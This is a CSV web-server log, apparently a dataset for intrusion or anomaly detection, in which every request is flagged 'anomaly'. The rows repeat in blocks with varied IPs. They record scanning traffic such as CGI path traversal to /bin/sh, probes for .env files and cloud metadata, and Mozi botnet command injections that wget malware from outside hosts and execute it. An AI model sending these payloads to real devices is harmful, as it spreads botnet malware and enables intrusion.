ip,date,method,endpoint,status,size,flag
183.76.10.228,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
123.217.74.207,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
104.198.49.81,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
3.145.37.44,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
1.88.55.162,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
136.108.56.111,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
21.203.210.114,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
24.106.49.208,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
222.229.253.206,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
159.205.9.192,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
80.222.205.49,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
154.26.53.49,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
83.88.66.52,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
59.67.5.193,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
153.223.21.214,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
39.134.6.195,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
210.107.177.248,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
202.132.19.115,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
87.18.236.114,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
212.63.0.71,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
219.106.1.11,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
52.19.104.54,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
49.188.178.112,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
32.31.186.110,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
217.25.153.251,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
125.146.38.141,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
37.224.20.228,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
56.4.137.56,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
92.105.242.55,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
8.192.190.243,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
21.182.170.76,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
25.236.102.97,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
225.143.139.45,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
133.116.143.139,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
249.72.54.28,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
161.215.27.136,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
92.20.189.240,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
118.38.81.132,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
22.49.16.98,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
197.142.192.174,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
158.122.235.252,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
205.71.7.245,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
183.196.85.207,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
151.79.240.155,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
53.246.204.9,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
141.40.225.193,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
100.158.12.79,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
33.144.138.224,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
122.233.4.131,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
21.152.156.175,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
17.65.160.177,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
125.56.124.29,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
232.187.208.231,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
175.16.189.148,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
212.23.194.138,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
168.77.64.119,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
222.210.130.244,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
189.98.174.159,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
142.58.88.237,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
250.61.12.197,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
43.214.35.146,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
142.119.223.179,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
168.213.213.163,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
76.157.47.119,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
222.225.159.185,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
231.100.175.123,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
212.77.49.181,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
248.216.97.63,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
186.95.31.70,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
195.23.152.158,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
58.195.107.89,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
76.242.75.118,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
36.53.93.152,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
134.144.180.129,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
220.18.93.45,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
6.191.150.9,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
238.124.214.114,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
197.67.166.206,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
69.194.95.251,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
147.15.60.233,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
179.141.183.52,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
22.117.252.143,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
97.60.238.232,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
101.142.242.174,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
197.253.50.2,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
153.241.153.162,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
114.75.41.189,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
98.197.219.130,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
63.148.202.249,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
142.75.6.163,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
207.33.64.81,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
176.39.111.88,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
172.195.192.162,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
6.234.172.217,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
106.176.135.68,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
98.197.81.43,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
203.196.205.138,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
253.25.172.58,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
106.164.209.79,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
208.109.106.170,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
171.63.193.50,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
254.185.67.205,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
6.193.252.232,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
244.126.175.185,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
113.163.144.33,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
242.182.214.229,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
18.223.111.9,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
66.214.91.228,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
176.109.21.138,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
181.126.59.65,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
209.133.227.109,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
138.182.140.115,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
190.182.147.40,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
33.76.179.201,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
161.251.49.122,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
254.177.159.22,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
49.165.196.108,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
20.63.185.181,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
180.107.156.228,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
140.24.250.246,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
137.47.133.207,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
62.102.41.30,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
132.8.246.124,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
57.214.168.7,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
49.180.180.253,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
65.178.160.113,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
238.3.214.16,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
16.193.249.3,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
14.165.97.127,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
42.5.123.63,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
99.169.1.14,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
182.47.158.232,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
8.16.108.151,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
247.73.247.28,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
159.11.90.91,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
239.2.171.164,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
179.7.161.85,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
176.39.178.32,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
63.51.142.28,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
80.154.127.80,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
135.16.122.204,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
245.63.58.16,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
30.75.135.60,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
45.114.240.143,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
59.240.84.163,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
186.45.32.177,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
149.29.21.0,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
177.158.112.148,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
9.97.2.239,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
68.191.193.100,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
228.139.175.150,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
128.225.162.69,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
58.7.237.101,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
157.127.118.234,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
52.118.62.214,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
57.32.125.157,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
198.76.125.99,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
96.122.163.198,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
169.142.108.139,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
90.225.129.58,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
236.113.231.89,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
120.178.18.48,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
124.46.81.186,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
142.205.159.110,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
228.79.130.217,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
176.232.11.35,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
109.30.19.115,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
127.57.86.221,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
211.36.108.53,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
55.140.113.75,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
192.175.199.241,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
84.142.96.47,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
102.189.139.87,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
96.159.181.62,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
179.46.144.58,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
132.21.2.237,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
177.96.32.254,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
150.192.197.226,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
91.74.36.229,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
78.17.228.74,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
148.184.51.187,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
171.251.110.142,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
100.106.199.55,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
35.246.179.71,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
8.221.250.143,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
69.3.167.230,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
105.24.200.24,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
196.205.52.188,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
135.169.179.30,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
165.19.159.205,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
167.131.33.210,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
90.159.176.69,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
133.172.51.161,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
252.27.231.130,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
233.7.170.105,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
205.48.21.65,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
76.192.112.106,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
127.143.176.37,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
41.188.133.71,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
164.9.128.216,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
145.87.94.18,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
110.77.201.11,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
194.91.9.177,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
129.130.129.105,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
100.118.70.21,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
149.60.69.25,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
242.157.153.195,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
164.148.174.236,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
114.119.144.104,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
151.244.20.49,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
36.231.13.75,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
62.14.243.88,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
141.241.24.236,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
83.94.39.125,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
26.145.196.221,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
83.25.60.222,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
29.207.223.228,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
52.66.173.210,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
77.146.87.174,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
40.176.222.200,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
232.20.112.220,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
132.73.242.117,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
27.145.103.134,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
173.68.163.28,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
71.219.64.80,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
172.153.157.67,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
141.140.206.182,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
94.211.242.236,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
21.176.111.46,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
195.145.88.149,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
11.43.136.194,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
37.16.234.203,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
12.69.25.36,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
167.45.184.96,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
95.142.193.98,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
28.224.85.178,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
68.82.174.46,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
101.12.189.12,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
88.240.251.223,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
101.198.135.242,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
144.203.108.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
19.6.220.247,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
16.201.57.205,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
231.40.72.73,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
98.37.243.170,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
133.168.48.54,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
247.33.221.130,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
